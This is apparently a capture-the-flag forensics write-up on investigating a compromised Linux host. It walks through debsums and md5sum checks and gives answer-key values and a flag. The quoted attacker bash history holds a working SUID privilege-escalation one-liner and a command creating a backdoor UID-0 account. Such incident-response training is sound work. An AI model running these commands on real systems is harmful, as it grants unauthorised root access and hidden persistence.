## Another area to look at within our compromised host's file system is identifying binaries and executables that the attacker may have created, altered, or exploited through permission misconfigurations

### Run the debsums utility on the compromised host to check only configuration files. Which file came back as altered?
Answer: /etc/sudoers

Solution: run debsums command to check the files which were altered

investigator@ip-10-10-20-24:/home$ sudo debsums -e -s
debsums: changed file /etc/sudoers (from sudo package)

### What is the md5sum of the binary that the attacker created to escalate privileges to root?
Anwer: 7063c3930affe123baecd3b340f1ad2c

Solution: for escalating privileges, attacker set SUID bit on a file whih we can see from the history of commands executed.

investigator@ip-10-10-20-24:/home/jane$ sudo cat .bash_history 
whoami
groups
cd ~
ls -al
find / -perm -u=s -type f 2>/dev/null
/usr/bin/python3.8 -c 'import os; os.execl("/bin/sh", "sh", "-p", "-c", "cp /bin/bash /var/tmp/bash && chown root:root /var/tmp/bash && chmod +s /var/tmp/bash")'
ls -al /var/tmp
exit
useradd -o -u 0 b4ckd00r3d
exit
THM{f38279ab9c6af1215815e5f7bbad891b}

==> We can see attacker made copy of "bash" file to /var/tmp/bash directory and set the SUID bit to execute it with elevated priviliges.
we can use md5sum command to check the hash of the bash file 

investigator@ip-10-10-20-24:/home/jane$ md5sum /var/tmp/bash 
7063c3930affe123baecd3b340f1ad2c  /var/tmp/bash

